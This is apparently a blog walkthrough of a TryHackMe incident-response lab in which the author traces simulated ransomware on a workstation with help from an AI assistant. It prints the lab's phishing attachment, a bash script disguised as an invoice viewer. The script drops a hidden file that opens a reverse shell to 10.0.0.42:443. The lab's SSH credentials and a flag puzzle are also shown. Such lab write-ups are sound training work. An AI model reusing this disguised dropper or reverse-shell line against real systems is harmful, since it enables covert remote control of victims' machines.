---
title: "ContAInment"
date: 2025-07-12 01:09:33 +0300
author: oste
description: Can you help contain the ransomware threat with the help of AI?
image: /assets/img/Posts/Containment.png
categories: [Tryhackme, Medium]
tags:
  [AI, ransomware]
---

## Mission

You are a Security Analyst at **West Tech**, a classified defence and R&D contractor. Early this morning, internal monitoring systems flagged unusual network activity originating from the workstation of senior researcher **Oliver Deer**. Upon accessing the machine, a ransom note was discovered on the desktop, suggesting that sensitive project data had been exfiltrated and encrypted. Your job is to investigate the incident: identify how the attacker gained access, trace their actions, recover any stolen data, and neutralise the threat. Time is critical; the integrity of West Tech’s most sensitive technologies may be at risk.

## Lab

After giving your machines a couple of minutes to boot up, you’ll have access to:

- A workstation environment. You have been granted SSH access to the affected employee's workstation. 
- A trusty AI IR security assistant, armed with "tools" built and designed specifically to help you with the heavy lifting in this challenge. They don't need to be manually triggered by yourself, our AI is a smart cookie and can intelligently determine when these tools should be triggered from prompt context. Some of the tools may provide hints as to when to engage the AI for help and are presented in the "available tools" section in chronological order in which they can be used throughout the investigation. 

![image](https://gist.github.com/user-attachments/assets/eb78a544-0db3-4d83-a796-bf912ae7c3d8)


- You can simply use it as you would a chatbot. **Another cool feature is that this AI is deployed on the same system as the workstation you are investigating and so has access to all the files you do, meaning you can give it file paths in your queries.** The AI is accessible via: `http://MACHINE_IP:7860/?__theme=light`

This challenge is built to reflect a real defensive scenario, where all tasks can be accomplished without the use of your AI companion and its tools, but can be done with far more efficiency when taken advantage of. And with that, you're all set to go! Can you help save the day and contAIn the threat?  
  

Can you contAIn the threat and find the flag?

![image](https://gist.github.com/user-attachments/assets/f168fb76-fc18-4da6-b672-8de4082e15f0)

`ssh o.deer@MACHINE_IP` Password: `TryHackMe!`.

![image](https://gist.github.com/user-attachments/assets/13bd1cff-c111-44f3-8ef7-9306f7c28999)


```bash
o.deer@west-tech-workstation:~/Mail$ cat *
Subject: System Downtime
From: sender0@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-11

Details follow...

Subject: Vault-Tek Engineering Update
From: sender1@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-12

Details follow...

Subject: Annual Leave Approved
From: sender2@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-13

Details follow...

Subject: Container Registry Updated
From: sender3@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-14

Details follow...

Subject: New Lab Policy Draft
From: sender4@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-15

Details follow...

Subject: VPN Certificate Renewal
From: sender5@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-16

Details follow...

Subject: Quarterly Performance Review
From: sender6@westtech.internal
To: o.deer@westtech.internal
Date: 2025-06-17

Details follow...

Subject: INVOICE - URGENT REVIEW REQUIRED
From: billing@westteck-payments.com
To: o.deer@westtech.internal
Date: 2025-06-17

Dear O.Deer,

Please review the attached invoice for last quarter's procurement activity.

Failure to respond in 24 hours will result in service suspension.

Attachment: invoice_payload.scr
```
{: .nolineno }

![image](https://gist.github.com/user-attachments/assets/605ad1d5-75c0-4b56-ba72-521fe72bef4c)


```bash
o.deer@west-tech-workstation:~/Mail$ find / -type f -name "invoice_payload.scr" 2>/dev/null
/home/o.deer/Downloads/invoice_payload.scr
o.deer@west-tech-workstation:~/Mail$ file /home/o.deer/Downloads/invoice_payload.scr
/home/o.deer/Downloads/invoice_payload.scr: ASCII text
o.deer@west-tech-workstation:~/Mail$ wc /home/o.deer/Downloads/invoice_payload.scr
 24  77 620 /home/o.deer/Downloads/invoice_payload.scr
o.deer@west-tech-workstation:~/Mail$ cat /home/o.deer/Downloads/invoice_payload.scr
cat << 'EOF' | sudo tee /home/o.deer/Downloads/invoice_payload.scr > /dev/null
#!/bin/bash
# Q3 Procurement Invoice Viewer - [Secured PDF - Do Not Share]

echo "Loading encrypted document... please wait."
sleep 2

TMP_DIR="/tmp/.westproc"
mkdir -p "$TMP_DIR"

# Drop payload (simulated reverse shell trigger)
cat << 'PAYLOAD' > "$TMP_DIR/.syncd.sh"
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.42/443 0>&1
PAYLOAD

chmod +x "$TMP_DIR/.syncd.sh"
nohup "$TMP_DIR/.syncd.sh" &>/dev/null &

echo "Error: Failed to load document (corrupted file)."
EOF

# Make it executable
sudo chmod +x /home/o.deer/Downloads/invoice_payload.scr
```
{: .nolineno }

The file **invoice_payload.scr** is a bash script disguised as a "**Q3 Procurement Invoice Viewer**" that creates a hidden directory (`/tmp/.westproc`) and drops a secondary script (`.syncd.sh`) to establish a reverse shell to `10.0.0.42:443`, allowing an attacker to remotely control the system. 


![image](https://gist.github.com/user-attachments/assets/e9595411-d6d6-4655-953c-16ea17e82811)


```bash
o.deer@west-tech-workstation:~$ unzip westtech_projects_encrypted.zip 
Archive:  westtech_projects_encrypted.zip
   creating: home/o.deer/westtech_projects/
[westtech_projects_encrypted.zip] home/o.deer/westtech_projects/vault_tek_collab_agenda.doc password: 
   skipping: home/o.deer/westtech_projects/vault_tek_collab_agenda.doc  incorrect password
   skipping: home/o.deer/westtech_projects/internal_security_incident_233.json  incorrect password
   skipping: home/o.deer/westtech_projects/thm_flags.txt  incorrect password
   skipping: home/o.deer/westtech_projects/prototype_plasma_launcher_test_logs.log  incorrect password
   skipping: home/o.deer/westtech_projects/email_export_april2025.eml  incorrect password
   skipping: home/o.deer/westtech_projects/thm_flags_guide.txt  incorrect password
   skipping: home/o.deer/westtech_projects/project_chimera_specs.txt  incorrect password
   skipping: home/o.deer/westtech_projects/fusion_cell_mk3_blueprints.pdf  incorrect password
```
{: .nolineno }

![image](https://gist.github.com/user-attachments/assets/20a93142-d9be-47dd-ab56-7fc0f4f743ea)

```bash
o.deer@west-tech-workstation:~$ ls -la Documents/
total 12
drwxr-xr-x  3 o.deer o.deer 4096 Jul  2 15:59 .
drwxr-xr-x 15 o.deer o.deer 4096 Jul 11 07:09 ..
drwxr-xr-x  6 root   root   4096 Jun 18 11:58 pcap_dumps
```
{: .nolineno }

![image](https://gist.github.com/user-attachments/assets/98a638fc-5196-47e5-bd68-8c84e400f3f3)

![image](https://gist.github.com/user-attachments/assets/a40ad1fa-b058-425a-bbb4-2fbc6b2e113e)

![image](https://gist.github.com/user-attachments/assets/7ce2df72-f5d6-40ea-91fc-30e4ea4820c1)

![image](https://gist.github.com/user-attachments/assets/e64461c6-5dcf-499a-bf0a-47f3fbe91fb1)

Unzzip

![image](https://gist.github.com/user-attachments/assets/53c71c89-343c-45d1-a1ff-6c751861c1c8)

```bash
o.deer@west-tech-workstation:~/home/o.deer/westtech_projects$ cat thm_flags_guide.txt

                                                  _       
                                                 | |      
                   ___ ___  _ __   __ _ _ __ __ _| |_ ___ 
                 / __/ _ \| '_ \ / _` | '__/ _` | __/ __|
                | (_| (_) | | | | (_| | | | (_| | |_\__ \
                 \___\___/|_| |_|\__, |_|  \__,_|\__|___/
                                 __/ |                  
                                 |___/      


You successfully decrypted the encrypted archive from West Tech.

The experimental FEV logs, Vault-Tek alliance drafts, and prototype weapon designs are now **secured**.

Your decisive actions have ensured:

               the threat was contAIned.

================================================================

What now?

Inside this directory, you'll find a file called:

    thm_flags.txt

This file contains **500 base64-encoded strings**.

When decoded, each string becomes a TryHackMe-style flag:

    thm{n1,n2,n3,n4,n5}

Each flag is exactly 5 comma-separated numbers between 10\u201399.

But only **one** of them is real.

The **true flag** is the only one with **exactly 3 prime numbers** in its contents.

================================================================

Not up for counting primes across 500 entries?

Your AI assistant is ready. Ask your AI friend for some help , it should engage liberty_prime to do the job for you!
```
{: .nolineno }


```bash
o.deer@west-tech-workstation:~/home/o.deer/westtech_projects$ wc thm_flags.txt 
  500   500 14500 thm_flags.txt
o.deer@west-tech-workstation:~/home/o.deer/westtech_projects$ head thm_flags.txt 
dGhtezUyLDY1LDE3LDk1LDE0fQ==
dGhtezM1LDkwLDk5LDEzLDM2fQ==
dGhtezQ4LDg0LDY2LDUxLDEzfQ==
dGhtezUxLDU1LDI3LDUzLDQxfQ==
dGhtezI4LDcxLDQ4LDg4LDU3fQ==
dGhtezMzLDY4LDMxLDk1LDYyfQ==
dGhtezE0LDkzLDgyLDk2LDM3fQ==
dGhtezI2LDcyLDE1LDg4LDEyfQ==
dGhtezI0LDIzLDI2LDQ4LDg4fQ==
dGhtezkxLDE5LDk4LDMzLDIzfQ==
```
{: .nolineno }

![image](https://gist.github.com/user-attachments/assets/fd9a8af5-d2b8-4d98-aa66-5fb53a6c02a1)

![image](https://gist.github.com/user-attachments/assets/f67e489f-a0a2-4b91-a025-d190f6e311ff)

